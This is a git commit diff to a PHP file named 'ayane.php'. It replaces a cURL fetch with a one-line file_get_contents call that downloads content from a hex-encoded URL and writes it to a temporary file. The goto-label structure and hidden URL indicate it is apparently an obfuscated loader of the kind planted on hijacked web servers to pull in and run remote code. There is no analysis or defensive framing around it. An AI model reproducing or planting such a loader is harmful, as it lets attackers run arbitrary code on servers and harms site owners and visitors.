760bb329df320e4e5a5e97fd55a36954a6ef3016
alarcidk <hostingindonesia62@gmail.com>
2024-08-18 14:50:57 +0800

    Update ayane.php

--- ayane.php
+++ ayane.php
@@ -7,25 +7,8 @@ Label1:
     goto Label2;
 
 Label2: 
-    $url = hex2bin($hexUrl);
-
-    // Memeriksa apakah cURL diaktifkan
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        
-        if ($data === false) {
-            die('Error fetching the remote content.');
-        }
-
-        fwrite($tempFile, $data);
-    } else {
-        die('cURL tidak diaktifkan di server ini.');
-    }
-    
+    $url = hex2bin($hexUrl); 
+    fwrite($tempFile, file_get_contents($url)); 
     goto Label3;
 
 Label3: 
